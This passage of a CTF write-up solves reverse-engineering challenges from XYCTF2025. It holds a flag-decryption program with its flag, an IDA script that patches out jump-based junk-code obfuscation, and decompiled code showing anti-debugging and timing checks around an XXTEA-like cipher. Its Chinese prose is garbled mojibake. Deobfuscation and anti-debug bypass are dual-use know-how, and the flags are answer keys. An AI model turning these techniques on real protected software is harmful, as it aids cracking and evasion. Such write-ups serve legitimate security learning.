class="number">0x22</span>,</span><br><span class="line">        <span class="number">0x81</span>, <span class="number">0x83</span>, <span class="number">0x23</span>, <span class="number">0x31</span>, <span class="number">0xCB</span>, <span class="number">0x1B</span>, <span class="number">0x22</span>, <span class="number">0xFB</span>, <span class="number">0x25</span>, <span class="number">0xC2</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0x73</span>, <span class="number">0x22</span>, <span class="number">0xFA</span>, <span class="number">0x03</span>,</span><br><span class="line">        <span class="number">0x9C</span>, <span class="number">0x4B</span>, <span class="number">0x5B</span>, <span class="number">0x49</span>, <span class="number">0x97</span>, <span class="number">0x87</span>, <span class="number">0xDB</span>, <span class="number">0x51</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decrypt_func</span>(Input, <span class="number">40</span>);</span><br><span class="line">    Input[<span class="number">2</span>] += <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">26</span>] -= <span class="number">85</span>;</span><br><span class="line">    Input[<span class="number">35</span>] -= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">14</span>] += <span class="number">9</span>;</span><br><span class="line">    Input[<span class="number">27</span>] -= <span class="number">6</span>;</span><br><span class="line">    Input[<span class="number">6</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">1</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">27</span>] += <span class="number">14</span>;</span><br><span class="line">    Input[<span class="number">25</span>] += <span class="number">3</span>;</span><br><span class="line">    Input[<span class="number">26</span>] += <span class="number">4</span>;</span><br><span class="line">    Input[<span class="number">4</span>] ^= <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">3</span>] -= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">12</span>] += <span class="number">10</span>;</span><br><span class="line">    Input[<span class="number">37</span>] -= <span class="number">2</span>;</span><br><span class="line">    Input[<span class="number">32</span>] -= <span class="number">2</span>;</span><br><span class="line">    Input[<span class="number">9</span>] -= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">26</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">4</span>] += <span class="number">13</span>;</span><br><span class="line">    Input[<span class="number">8</span>] ^= <span class="number">15</span>;</span><br><span class="line">    Input[<span class="number">10</span>] += <span class="number">14</span>;</span><br><span class="line">    Input[<span class="number">16</span>] -= <span class="number">7</span>;</span><br><span class="line">    Input[<span class="number">12</span>] -= <span class="number">7</span>;</span><br><span class="line">    Input[<span class="number">34</span>] ^= <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">21</span>] ^= <span class="number">10</span>;</span><br><span class="line">    Input[<span class="number">39</span>] -= <span class="number">126</span>;</span><br><span class="line">    Input[<span class="number">7</span>] += <span class="number">2</span>;</span><br><span class="line">    Input[<span class="number">15</span>] ^= <span class="number">3</span>;</span><br><span class="line">    Input[<span class="number">10</span>] ^= <span class="number">10</span>;</span><br><span class="line">    Input[<span class="number">34</span>] -= <span class="number">11</span>;</span><br><span class="line">    Input[<span class="number">18</span>] += <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">25</span>] += <span class="number">9</span>;</span><br><span class="line">    Input[<span class="number">14</span>] ^= <span class="number">6</span>;</span><br><span class="line">    Input[<span class="number">0</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">10</span>] -= <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">27</span>] ^= <span class="number">7</span>;</span><br><span class="line">    Input[<span class="number">13</span>] ^= <span class="number">6</span>;</span><br><span class="line">    Input[<span class="number">13</span>] ^= <span class="number">4</span>;</span><br><span class="line">    Input[<span class="number">23</span>] ^= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">34</span>] ^= <span class="number">14</span>;</span><br><span class="line">    Input[<span class="number">18</span>] += <span class="number">52</span>;</span><br><span class="line">    Input[<span class="number">38</span>] -= <span class="number">119</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.40s\n&quot;</span>, Input);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// flag&#123;L3@rn-ng_1n_0ld_sch00b_@nd_g3x_j0y&#125; -&gt; flag&#123;L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}</p><h2 id="EzObf"><a href="#EzObf" class="headerlink" title="EzObf"></a>EzObf</h2><p>main_0å‡½æ•°è·Ÿå…¥å‘ç°æœ‰æ··æ·†ï¼Œçº¢æ¡†å¤„ä¸ºåŸçœŸå®æ±‡ç¼–æŒ‡ä»¤ï¼Œå…¶ä»–éƒ½æ˜¯æ··æ·†æŒ‡ä»¤ã€‚</p><p>æ··æ·†æµç¨‹ï¼š</p><ol><li>æ‰§è¡ŒçœŸå®æŒ‡ä»¤</li><li>call $+5æ‰§è¡Œpop raxï¼Œraxå°±æ˜¯callæ—¶pushåˆ°æ ˆçš„è¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯pop raxæŒ‡ä»¤çš„åœ°å€ã€‚</li><li>ç»™ebxèµ‹å€¼ï¼Œè¿›è¡Œrolè®¡ç®—ï¼Œæœ€åç”¨raxåŠ ä¸Šæˆ–å‡å»ï¼ˆå…±ä¸¤ç§ï¼‰rbxï¼Œå¾—åˆ°è·³è½¬åœ°å€ï¼Œè¿›è¡Œjmp raxã€‚</li></ol><p>ä¹‹åæ¯jmpè¿‡å»ä¸€æ¬¡ï¼Œé‚£è¾¹å°±éƒ½æ˜¯ä¸€æ ·çš„ç»“æ„ï¼Œpopfqå’Œpushfqä¹‹é—´å°±æ˜¯çœŸå®æ±‡ç¼–ã€‚</p><p>deobfçš„æ€è·¯å³ä¸ºnopé‚£ä¸€å †popå’Œpushï¼Œä¿ç•™çœŸå®æ±‡ç¼–æŒ‡ä»¤ï¼Œç„¶åè®¡ç®—è·³è½¬åœ°å€ï¼Œæ‰‹åŠ¨è®¡ç®—ç›¸å¯¹åœ°å€å†™jmpï¼Œä¿æŒä»£ç æ‰§è¡Œæµç¨‹ã€‚</p><p><img src="/2025/04/07/XYCTF2025/43.png"></p><p>deobf idcè„šæœ¬ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="title">NopCode</span><span class="params">(Addr, Length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">PatchByte</span>(Addr + i, <span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">rol</span><span class="params">(value, count, bits = <span class="number">32</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    count = count % bits;</span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; count) | (value &gt;&gt; (bits - count))) &amp; ((<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœç´¢çœŸå®æ±‡ç¼–ä»£ç çš„ä¸‹ä¸€ä¸ªåœ°å€</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">FindEnd</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = <span class="built_in">Dword</span>(Addr + i);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0x5153509C</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Addr + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœç´¢æœ€åçš„jmp raxæŒ‡ä»¤</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">FindJmpRax</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = <span class="built_in">Word</span>(Addr + i);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0xE0FF</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Addr + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœç´¢call $+5</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">FindCall</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = <span class="built_in">Dword</span>(Addr + i);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0xE8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Addr + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> StartAddr = <span class="number">0x1401F400D</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// æœç´¢çœŸå®æ±‡ç¼–ä»£ç çš„ä¸‹ä¸€ä¸ªæŒ‡ä»¤åœ°å€</span></span><br><span class="line">        <span class="keyword">auto</span> EndAddr = <span class="built_in">FindEnd</span>(StartAddr);</span><br><span class="line">        <span class="keyword">if</span> (EndAddr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// çœŸå®æ±‡ç¼–ä»£ç çš„å­—èŠ‚é•¿åº¦</span></span><br><span class="line">        <span class="keyword">auto</span> CodeLength = EndAddr - StartAddr - <span class="number">13</span>;</span><br><span class="line">        <span class="comment">// æœç´¢Call $+5</span></span><br><span class="line">        <span class="keyword">auto</span> CallAddr = <span class="built_in">FindCall</span>(StartAddr + <span class="number">13</span> + CodeLength);</span><br><span class="line">        <span class="keyword">if</span> (CallAddr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// call $+5çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼Œå³callæ—¶pushåˆ°æ ˆçš„è¿”å›åœ°å€</span></span><br><span class="line">        <span class="keyword">auto</span> CalcAddr = CallAddr + <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">auto</span> ebx = <span class="built_in">Dword</span>(CalcAddr + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">auto</span> rol_Value = <span class="built_in">Byte</span>(CalcAddr + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">auto</span> Mode = <span class="built_in">Dword</span>(CalcAddr + <span class="number">9</span>);</span><br><span class="line">        ebx = <span class="built_in">rol</span>(ebx, rol_Value);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æœç´¢æœ€å°¾éƒ¨çš„jmp raxæŒ‡ä»¤åœ°å€</span></span><br><span class="line">        <span class="keyword">auto</span> JmpRaxAddr = <span class="built_in">FindJmpRax</span>(StartAddr);</span><br><span class="line">        <span class="keyword">if</span> (JmpRaxAddr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ç¬¬ä¸€éƒ¨åˆ†åƒåœ¾æŒ‡ä»¤é•¿åº¦</span></span><br><span class="line">        <span class="keyword">auto</span> TrushCodeLength_1 = CallAddr - (StartAddr + <span class="number">13</span> + CodeLength);</span><br><span class="line">        <span class="comment">// ç¬¬äºŒéƒ¨åˆ†åƒåœ¾æŒ‡ä»¤é•¿åº¦</span></span><br><span class="line">        <span class="keyword">auto</span> TrushCodeLength_2 = JmpRaxAddr - CallAddr + <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// Nopæ‰æ— ç”¨çš„æ‰€æœ‰ä»£ç </span></span><br><span class="line">        <span class="built_in">NopCode</span>(CallAddr, TrushCodeLength_2);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">NopCode</span>(StartAddr, <span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">NopCode</span>(StartAddr + <span class="number">13</span> + CodeLength, TrushCodeLength_1);</span><br><span class="line">        <span class="comment">// ä¸€å…±ä¸¤ç§åœ°å€è®¡ç®—ï¼ŒåŠ å’Œå‡</span></span><br><span class="line">        <span class="keyword">if</span> (Mode == <span class="number">0xffC32B48</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            CalcAddr = CalcAddr - ebx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Mode == <span class="number">0xffC30348</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            CalcAddr = CalcAddr + ebx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> JmpCodeAddr = EndAddr;</span><br><span class="line">        <span class="comment">// è®¡ç®—ç›¸å¯¹è·³è½¬åœ°å€</span></span><br><span class="line">        <span class="keyword">auto</span> JmpOffset = CalcAddr - JmpCodeAddr + <span class="number">5</span>;</span><br><span class="line">        <span class="comment">// å†™å…¥jmpæŒ‡ä»¤</span></span><br><span class="line">        <span class="built_in">PatchByte</span>(JmpCodeAddr, <span class="number">0xE9</span>);</span><br><span class="line">        <span class="built_in">PatchDword</span>(JmpCodeAddr + <span class="number">1</span>, JmpOffset);</span><br><span class="line">        <span class="comment">// jmpçš„åœ°å€ä¸ºä¸‹ä¸€æ¬¡deobfèµ·å§‹åœ°å€</span></span><br><span class="line">        StartAddr = CalcAddr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œï¼ŒæŠŠmain_0å‰©ä½™ä»£ç éƒ½æ‰‹åŠ¨nopå³å¯ã€‚</p><p><img src="/2025/04/07/XYCTF2025/44.png"></p><p>ç„¶åApply patches to input fileï¼Œåº”ç”¨ä¸€ä¸‹patchï¼Œé‡æ–°æ‰“å¼€idaè½½å…¥ç¨‹åºåˆ†æã€‚</p><p>ä»main_0çš„jmpè¿›å…¥ä¸¤å±‚åˆ°è¿™è¾¹ï¼Œç„¶åç”¨IDA Delete Functionåˆ é™¤sub_1401F7B77å‡½æ•°ï¼Œç„¶åå¯¹jmpé‚£è¾¹æŒ‰Eå³å¯é‡æ–°é‡æ„å®Œmainå‡½æ•°ï¼ˆå¦‚å›¾2ï¼‰ï¼ŒF5å³å¯åˆ†æã€‚</p><p><img src="/2025/04/07/XYCTF2025/45.png"></p><p><img src="/2025/04/07/XYCTF2025/46.png"></p><p>Mainå‡½æ•°åŸä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// rdi</span></span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp-20h] [rbp-458h] BYREF</span></span><br><span class="line">  _DWORD v10[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-438h] BYREF</span></span><br><span class="line">  _BYTE v11[<span class="number">64</span>]; <span class="comment">// [rsp+8h] [rbp-430h] BYREF</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// [rsp+48h] [rbp-3F0h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [rsp+64h] [rbp-3D4h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+84h] [rbp-3B4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// [rsp+A4h] [rbp-394h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+C4h] [rbp-374h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+E4h] [rbp-354h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> k; <span class="comment">// [rsp+104h] [rbp-334h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+124h] [rbp-314h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+144h] [rbp-2F4h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+164h] [rbp-2D4h]</span></span><br><span class="line">  _DWORD v22[<span class="number">11</span>]; <span class="comment">// [rsp+188h] [rbp-2B0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v23; <span class="comment">// [rsp+1B4h] [rbp-284h]</span></span><br><span class="line">  BOOL v24; <span class="comment">// [rsp+1D4h] [rbp-264h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// [rsp+1F8h] [rbp-240h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v26; <span class="comment">// [rsp+218h] [rbp-220h]</span></span><br><span class="line">  _DWORD v27[<span class="number">12</span>]; <span class="comment">// [rsp+238h] [rbp-200h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 m; <span class="comment">// [rsp+268h] [rbp-1D0h]</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [rsp+3F4h] [rbp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v30; <span class="comment">// [rsp+3F8h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+3FCh] [rbp-3Ch]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+400h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [rsp+408h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v34; <span class="comment">// [rsp+410h] [rbp-28h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+428h] [rbp-10h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+430h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v36 = v3;</span><br><span class="line">  v35 = v4;</span><br><span class="line">  v7 = v10;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">170</span>; i; --i )</span><br><span class="line">    *v7++ = <span class="number">-858993460</span>;</span><br><span class="line">  v34 = (<span class="type">unsigned</span> __int64)v10 ^ <span class="number">0x1401D9000LL</span>;</span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(<span class="number">0x1401ED104LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  <span class="built_in">sub_140087C02</span>(<span class="number">0x1401A1190LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">IsDebuggerPresent</span>() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_1400868E3</span>();</span><br><span class="line">    v12 = v11;</span><br><span class="line">    <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="number">0x10u</span>);</span><br><span class="line">    v23 = <span class="number">8</span>;</span><br><span class="line">    v29 = <span class="number">8</span>;</span><br><span class="line">    v20 = <span class="number">12</span>;</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    v16 = <span class="number">0x61C88646</span>;</span><br><span class="line">    v21 = <span class="number">0x95664B48</span>;</span><br><span class="line">    v19 = <span class="number">7</span>;</span><br><span class="line">    v24 = <span class="number">0</span>;</span><br><span class="line">    CurrentProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    <span class="built_in">CheckRemoteDebuggerPresent</span>(CurrentProcess, &amp;v24);</span><br><span class="line">    <span class="keyword">if</span> ( !v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">j_srand</span>(<span class="number">0xAABBu</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">        v22[j] = <span class="built_in">j_rand</span>();</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v29 = v19--;</span><br><span class="line">        v30 = v29 != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v30 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v15 += v16;</span><br><span class="line">        v17 = (v15 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v23; ++k )</span><br><span class="line">        &#123;</span><br><span class="line">          v26 = __rdtsc();</span><br><span class="line">          v13 = *(_DWORD *)&amp;v12[<span class="number">4</span> * ((k + <span class="number">1</span>) % v23)];</span><br><span class="line">          v29 = (<span class="number">4</span> * v13) ^ (*(_DWORD *)&amp;v12[<span class="number">4</span> * ((k + v23 - <span class="number">1</span>) % v23)] &gt;&gt; <span class="number">5</span>);</span><br><span class="line">          v30 = k + v23 - <span class="number">1</span>;</span><br><span class="line">          v31 = ((<span class="number">16</span> * *(_DWORD *)&amp;v12[<span class="number">4</span> * (v30 % v23)]) ^ (v13 &gt;&gt; <span class="number">3</span>)) + v29;</span><br><span class="line">          v32 = ((<span class="type">unsigned</span> __int8)v17 ^ (<span class="type">unsigned</span> __int8)k) &amp; <span class="number">3</span>;</span><br><span class="line">          v33 = (((*(_DWORD *)&amp;v12[<span class="number">4</span> * (v30 % v23)] ^ v22[v32]) + (v13 ^ v15)) ^ v31) + *(_DWORD *)&amp;v12[<span class="number">4</span> * k];</span><br><span class="line">          *(_DWORD *)&amp;v12[<span class="number">4</span> * k] = v33;</span><br><span class="line">          v14 = v33;</span><br><span class="line">          <span class="keyword">if</span> ( __rdtsc() - v26 &gt; <span class="number">0x83C0</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v27[<span class="number">0</span>] = <span class="number">0xA9934E2F</span>;</span><br><span class="line">      v27[<span class="number">1</span>] = <span class="number">0x30B90FA</span>;</span><br><span class="line">      v27[<span class="number">2</span>] = <span class="number">0xDCBF1D3</span>;</span><br><span class="line">      v27[<span class="number">3</span>] = <span class="number">0x328B5BDE</span>;</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">4</span>; ++m )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v27[m] != v10[m + <span class="number">2</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">sub_140087C02</span>(<span class="number">0x1401A11A8LL</span>);</span><br><span class="line">          <span class="built_in">j_system</span>(byte_1401A11A0);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sub_140087C02</span>(<span class="number">0x1401A11C0LL</span>);</span><br><span class="line">      <span 